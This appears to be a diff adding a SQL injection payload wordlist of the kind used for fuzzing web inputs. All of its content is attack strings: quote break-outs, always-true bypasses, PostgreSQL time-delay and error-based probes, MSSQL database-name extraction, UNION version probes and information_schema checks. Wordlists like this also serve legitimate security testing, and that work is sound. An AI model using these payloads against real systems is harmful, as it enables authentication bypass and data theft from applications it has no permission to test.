@@ -1,0 +1,33 @@
+'
+"
+`
+--
+--
+#
+' OR '1'='1
+" OR "1"="1
+` OR `1`=`1
+') OR ('1'='1
+") OR ("1"="1
+`) OR (`1`=`1
+' AND 1=CAST((CHR(113)||CHR(107)||CHR(112)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END))::text AS NUMERIC)
+' AND 1=(SELECT COUNT(*) FROM pg_sleep(5))--
+" AND 1=(SELECT COUNT(*) FROM pg_sleep(5))--
+') AND 1=(SELECT COUNT(*) FROM pg_sleep(5))--
+") AND 1=(SELECT COUNT(*) FROM pg_sleep(5))--
+1' AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases))--
+1" AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases))--
+1') AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases))--
+1") AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases))--
+' UNION SELECT null, version()--
+" UNION SELECT null, version()--
+') UNION SELECT null, version()--
+") UNION SELECT null, version()--
+' OR 1=1--
+" OR 1=1--
+') OR 1=1--
+") OR 1=1--
+' OR EXISTS(SELECT 1 FROM information_schema.tables)--
+" OR EXISTS(SELECT 1 FROM information_schema.tables)--
+') OR EXISTS(SELECT 1 FROM information_schema.tables)--
+") OR EXISTS(SELECT 1 FROM information_schema.tables)--
